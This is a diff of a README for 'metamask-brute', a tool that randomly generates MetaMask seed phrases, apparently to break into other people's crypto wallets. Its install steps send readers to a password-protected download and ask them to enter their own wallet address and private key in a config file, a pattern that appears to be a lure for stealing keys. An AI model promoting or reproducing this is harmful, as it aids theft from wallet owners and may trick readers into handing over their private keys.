@@ -1,16 +1,18 @@
 # metamask-brute
 
-
+![](https://github.com/deadspyexx/metamask-brute/blob/main/example.png?raw=true)
 
 ## For educational purposes only
 A program random generate (12, 18, 24) words metamask mnemonic phrase.
-
 
 ## Install
 - [Download](https://) the repository release and extract files with password `X`.
 - Edit the `address` and `private_key` fields in the `config.json` file.
 
 ## How it works
+
+![](https://github.com/deadspyexx/metamask-brute/blob/main/example2.jpg?raw=true)
+
 Let's take a bitcoin wallet as an example
 The initial phrase is the most important element when creating a Bitcoin wallet. It is derived through a series of mathematical operations using the official Bitcoin dictionary known as the "BIP-39 WORDLIST" which consists of 2048 words. The process begins by generating a random entropy, typically ranging from 128 to 256 bits and represented as a string of binary digits.
 
